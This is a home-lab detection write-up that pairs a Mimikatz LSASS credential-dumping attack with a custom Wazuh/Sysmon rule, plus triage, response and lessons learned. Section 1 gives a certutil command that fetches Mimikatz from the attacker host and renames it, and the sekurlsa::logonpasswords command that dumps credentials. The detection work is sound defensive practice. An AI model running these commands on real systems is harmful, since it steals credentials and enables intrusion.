# Scenario 05 — [Critical] Credential Dumping (Mimikatz / LSASS)

The post-compromise chain: it continues directly from Scenario 02, taking the
RDP foothold and showing what an attacker does *next* — pull a tool onto the host
and steal credentials out of memory. This is the scenario that validates the
custom Mimikatz rule and exercises the Credential Access tactic end-to-end.

| | |
|---|---|
| **MITRE ATT&CK** | T1003.001 (OS Credential Dumping: LSASS Memory) — chained from T1110 (Scenario 02) via T1105 (Ingress Tool Transfer) |
| **Attacker** | Kali — 192.168.56.10 |
| **Target** | Windows 10 — DESKTOP-T0LOHB5 (192.168.56.30) |
| **Detection source** | Wazuh agent → Sysmon (Event ID 1, process creation) |
| **Rules fired** | 100002 (custom, level 15 — Mimikatz by original filename) |
| **Status** | ⏳ Rule built — run to validate & capture evidence (see §7) |

---

## 1. Attack

This scenario assumes the foothold from **Scenario 02**: the `Client` account on
the Windows host has been compromised via RDP brute force, giving a hands-on
session on `192.168.56.30`. From there the attacker performs two actions.

**Step 1 — Pull the tool onto the host (T1105).** Mimikatz is served from Kali
(the same simple HTTP-server pattern used to detonate the phishing IOC in
Scenario 04) and fetched with `certutil`, a signed, built-in Windows binary
(a "LOLBin") — a common way to download tooling without introducing a new
executable downloader:

```bash
# Kali: serve the tool
python3 -m http.server 80
```
```powershell
# Windows (in the compromised session) — note the deliberate rename to m.exe
certutil.exe -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\Users\Public\m.exe
```

The rename to `m.exe` is intentional — it demonstrates that the detection below
does **not** rely on the file's name on disk.

**Step 2 — Dump credentials from memory (T1003.001).** Mimikatz is run against
LSASS to read credential material for accounts logged on to the host:

```powershell
C:\Users\Public\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

`privilege::debug` acquires the debug privilege needed to read another process's
memory; `sekurlsa::logonpasswords` is the module that reads LSASS. (Run from an
elevated/SYSTEM context, which the foothold provides.)

> _Evidence: `evidence/scenario-05-creddump/attack-output.txt`_

---

## 2. Detection

**Sysmon Event ID 1 (process creation)** is the key sensor here. When `m.exe`
launches, Sysmon records the process — and crucially logs the **OriginalFileName**
field, which is read from the PE's embedded version metadata, **not** from the
file's name on disk. Mimikatz's compiled binary carries `mimikatz.exe` in that
metadata, so renaming the file does not change it. Wazuh decodes this field as
`win.eventdata.originalFileName`.

**Custom rule 100002** (`config/local_rules.xml`, level **15** — the maximum
severity) matches on that field:

```xml
<rule id="100002" level="15">
  <field name="win.system.providerName">^Microsoft-Windows-Sysmon$</field>
  <field name="win.system.eventID">^1$</field>
  <field name="win.eventdata.originalFileName" type="pcre2">(?i)mimikatz\.exe</field>
  <description>Mimikatz Usage Detected (original filename match)</description>
  <mitre>
    <id>T1003</id>
  </mitre>
</rule>
```

Plain-English, line by line:
- `<field name="win.system.providerName">^Microsoft-Windows-Sysmon$</field>` — only Sysmon events.
- `<field name="win.system.eventID">^1$</field>` — only Event 1 (process creation).
- `<field name="win.eventdata.originalFileName" type="pcre2">(?i)mimikatz\.exe</field>` — case-insensitive regex match on the PE's original filename metadata.
- `level 15` — Wazuh's top severity; this is a "wake someone up" alert, not a maybe.

The rule therefore fires on `m.exe` even though nothing on disk is named
`mimikatz`.

**Why field-matching instead of a Sysmon rule group.** The rule originally
depended on `<if_group>sysmon_event1</if_group>`, but it never fired. The events
decode correctly (`win.eventdata.originalFileName` is populated), yet on this
pipeline the Windows events are handled by the `windows_eventchannel` decoder,
which does not place them in a `sysmon_event1` group — so the group dependency was
never satisfied. Matching the decoded fields directly (`providerName` + `eventID`
+ `originalFileName`) removes the dependency on a group that isn't produced, and
is the pattern Wazuh's own documentation uses for custom Sysmon rules. Confirmed
with `wazuh-logtest`: Phase 3 → rule 100002, level 15, T1003.

**certutil step (telemetry, optional rule).** The `certutil` download also
generates a Sysmon Event ID 1 record whose command line shows the full
`http://192.168.56.10/...` URL. That is visible in the telemetry as the Ingress
Tool Transfer (T1105) half of the chain; a custom rule on `certutil.exe` +
`urlcache`/`-f` is an easy add if you want it alerted rather than just observed.

> _Evidence: `evidence/scenario-05-creddump/wazuh-100002-alert.json`,
> `evidence/scenario-05-creddump/sysmon-event1.png`_

---

## 3. Triage

- **Severity** — rule 100002 is **level 15**. Mimikatz's PE metadata appearing in
  a process-creation event has essentially **no benign explanation** on an
  endpoint; this is not an alert that needs ruling out, it's one that needs
  responding to.
- **The rename tell** — the on-disk name was `m.exe`, but the detection fired on
  the embedded `mimikatz.exe`. That mismatch (benign-looking filename, known-bad
  binary identity) is itself a strong malicious signal.
- **Correlation across scenarios** — this fired on the same host
  (`192.168.56.30`) that was compromised in Scenario 02. Failed RDP logons →
  lockout → successful logon → **now credential dumping** is a coherent attacker
  progression, not an isolated event. Tying 100002 back to the Scenario 02 alerts
  is the analytic core.

**Verdict:** True positive, **critical**. Confirmed credential-dumping attempt on
an already-compromised host.

---

## 4. Response

Because LSASS was accessed, assume every credential cached in memory on that host
is now stolen (the signed-in user's hash/password, any service credentials, cached
domain credentials). This is a post-exploitation, high-impact event — the
**human-in-the-loop** tier of the response model, but acted on fast:

- **Isolate the host** (`192.168.56.30`) to stop further hands-on activity.
- **Force-reset credentials** for every account that had a session on the box —
  their secrets must be treated as compromised, not just the attacker's entry
  account.
- **Hunt for lateral movement** — dumped credentials are used to move to other
  hosts; check for logons elsewhere using those accounts.

There is no "block the source IP" action here as there is for brute force — the
attacker is already inside, so the response is containment and credential
rotation, not perimeter blocking.

---

## 5. The chain (how it threads the scenarios together)

```
RDP brute force (Scenario 02, T1110)  →  Client compromised
   →  certutil pulls Mimikatz onto the host            (T1105, Ingress Tool Transfer)
   →  Mimikatz dumps credentials from LSASS memory     (T1003.001, LSASS Memory)
```

The Ingress Tool Transfer and the Credential Access steps are directly causally
linked — download the tool, run the tool — so the chain reads as one fluid action
an attacker would actually take.

**Persistence was deliberately not modeled.** This scenario represents a fast
credential-harvesting ("smash-and-grab") operation; establishing persistence is a
common *next* move but was intentionally left out to keep the chain tight. It is
noted as a possible extension rather than a gap.

---

## 6. Lessons Learned

- **Detecting on OriginalFileName beats detecting on filename.** Matching the PE's
  embedded metadata (`win.eventdata.originalFileName`) means a simple rename
  doesn't evade the rule. Its honest limitation: an attacker who recompiles or
  edits the binary to strip/alter that metadata would slip past it — which is why
  a complementary, behavior-based detection on **LSASS access itself** (Sysmon
  Event ID 10, process access targeting `lsass.exe`) is the more robust control.
  Name-based rules catch the lazy case; behavior-based rules catch the capable one.
- **Why LSASS?** The Local Security Authority Subsystem Service holds credential
  material for signed-in users in memory — password hashes, Kerberos tickets, and
  in some configurations plaintext. "Dumping LSASS" means reading that process's
  memory to steal those credentials, which is exactly what
  `sekurlsa::logonpasswords` does. This is the concept that makes rule 100002,
  "pass-the-hash," and credential theft one connected story.
- **Severity should match consequence.** Level 15 is justified here because the
  event is both high-confidence and high-impact — contrast with recon (alert-only)
  or a single failed logon (noise until correlated).
- **`logtest` success ≠ live detection** (the recurring lab meta-lesson): confirm
  the rule fires on a real Sysmon event with the agent Active, then capture the
  evidence — don't rely on `wazuh-logtest` alone.

---

## 7. Validation & evidence capture

Rule 100002 was written during the build but **not yet triggered live** — this
scenario is the step that validates it. Run the attack above against the lab host,
then capture:

```bash
mkdir -p evidence/scenario-05-creddump

# the Mimikatz-usage alert (level 15) — wait for the Sysmon event to reach the manager
sudo grep '"id":"100002"' /var/ossec/logs/alerts/alerts.json | tail -1 | jq . \
  > evidence/scenario-05-creddump/wazuh-100002-alert.json
```

**Screenshots:** the rule 100002 alert in the dashboard/`alerts.log`, and the
Sysmon Event ID 1 record showing `OriginalFileName: mimikatz.exe` against the
on-disk name `m.exe` → `evidence/scenario-05-creddump/`.

> Once captured, update the **Status** in this file's header to ✅ Validated and
> move T1003 in `docs/mitre-coverage.md` from "rule built, detection ready" to a
> validated row citing this scenario.

**Expected alert (fill in with the real capture):**
```
<<paste the captured rule-100002 alert JSON / excerpt here after running>>
```
